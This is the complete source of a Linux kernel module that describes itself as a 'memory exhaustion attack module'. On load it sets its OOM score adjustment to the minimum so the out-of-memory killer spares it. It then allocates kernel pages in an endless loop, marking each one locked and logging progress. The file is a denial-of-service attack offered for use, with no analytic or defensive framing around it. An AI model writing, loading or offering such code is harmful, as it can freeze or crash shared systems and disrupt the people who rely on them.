#include <linux/module.h>
#include <linux/gfp.h>
#include <linux/oom.h>

static int __init memhog_init(void)
{
    struct page *page;
    unsigned long count = 0;
    
    // Bypass OOM killer adjustments
    current->signal->oom_score_adj = OOM_SCORE_ADJ_MIN;
    
    pr_emerg("MEMHOG: Starting memory exhaustion attack\n");
    
    while(1) {
        page = alloc_pages(GFP_KERNEL | __GFP_NOFAIL, 0);
        if (!page) break;
        
        // Prevent pages from being freed
        __SetPageLocked(page);
        count++;
        
        if (count % 1000 == 0)
            pr_info("MEMHOG: Allocated %lu pages (~%lu MB)\n",
                   count, (count * PAGE_SIZE) >> 20);
    }
    
    return 0;
}

module_init(memhog_init);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Memory exhaustion attack module");
